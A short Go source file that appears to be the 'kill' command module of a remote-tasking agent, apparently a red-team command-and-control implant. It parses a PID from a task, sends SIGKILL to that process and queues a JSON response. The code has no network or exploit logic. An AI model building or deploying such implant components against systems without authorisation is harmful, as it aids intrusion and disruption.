package kill

import (
	"encoding/json"
	"fmt"
	"os"
	"pkg/profiles"
	"pkg/utils/structs"
	"strconv"
	"sync"
	"syscall"
)

var mu sync.Mutex

//Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	pid, err := strconv.Atoi(task.Params)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	p, err := os.FindProcess(pid)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	p.Signal(syscall.SIGKILL)
	msg.Completed = true
	msg.UserOutput = fmt.Sprintf("Killed process with PID %s", task.Params)
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
